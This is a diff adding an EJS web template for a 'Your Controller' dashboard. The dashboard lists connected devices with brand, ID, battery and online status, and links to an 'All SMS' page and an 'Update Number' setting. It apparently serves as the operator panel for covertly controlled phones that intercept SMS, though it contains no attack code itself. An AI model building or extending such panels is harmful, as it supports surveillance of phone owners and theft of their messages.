@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Your Controller</title>
+  <link rel="stylesheet" href="/css/phon.css" />
+</head>
+<body>
+  <nav class="header-nav">
+    <div class="menu-icon">&#9776;</div>
+    <h1>Your Controller</h1>
+  </nav>
+
+  <div class="nav-links">
+    <a href="/api/admin/settings">Update Number</a>
+    <a href="/api/notification/sms">All SMS</a>
+    <a href="/api/auth/change-credentials">Password change</a>
+  </div>
+
+  <div class="dot">
+    <div class="container" id="deviceContainer">
+      <% 
+        // Devices ko uniqueid ke basis pe sort karna
+        const sortedDevices = devices.sort((a, b) => a.uniqueid - b.uniqueid);
+        
+        sortedDevices.forEach((device, index) => { 
+      %>
+        <div class="device-card" data-id="<%= device.uniqueid %>">
+          <div class="device-content">
+            <img src="/image/style.webp" alt="Device Icon" /> 
+            <div class="device-details">
+              <h2>Device <%= index + 1 %>: <%= device.brand %></h2>
+              <p><strong>Device Id :</strong> <%= device.uniqueid %></p>
+              <p><strong>Battery :</strong> <%= device.batteryLevel ? device.batteryLevel + '%' : 'N/A' %></p>
+            </div>
+          </div>
+          <div class="device-status <%= device.connectivity === 'Online' ? 'status-online' : 'status-offline' %>">
+            Status - <%= device.connectivity === 'Online' ? 'Online User' : 'Offline User' %>
+          </div>
+        </div>
+      <% }); %>
+    </div>
+  </div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="/js/script.js"></script>
+</body>
+</html>
